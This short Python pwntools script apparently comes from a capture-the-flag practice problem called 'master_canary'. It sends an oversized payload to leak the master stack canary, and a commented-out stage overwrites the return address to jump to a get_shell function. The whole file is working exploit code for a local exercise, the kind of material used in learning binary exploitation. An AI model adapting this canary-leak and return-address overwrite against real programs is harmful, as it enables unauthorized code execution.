from pwn import *

# p $rbp-0x110
# $1 = (void *) 0x7ffff7da3de0

rem = process("./Pwnable/master_canary/problem/master_canary")
elf = ELF("./Pwnable/master_canary/problem/master_canary")

rem.sendlineafter(b"> ", b'1')

pause()

canary_offset = 0x110
mc_offset = 0x928

payload = b'A' * (mc_offset + 1)
# payload = b'A' * 0x109
print(rem.recvuntil(b"> "))
rem.sendline(b'2')
rem.sendlineafter(b"Size: ", str(len(payload)).encode())
print(rem.recvuntil(b"Data: "))
rem.send(payload)
print(rem.recvuntil(payload))
print(rem.recvn(7))


# pause()

# payload = b'A' * 0x28
# payload += b'A' * 0x8
# payload += b'B' * 0x8
# payload += p64(elf.symbols['get_shell'])

# rem.sendlineafter(b"> ", b'3')
# rem.sendlineafter(b"comment: ", payload)

# rem.interactive()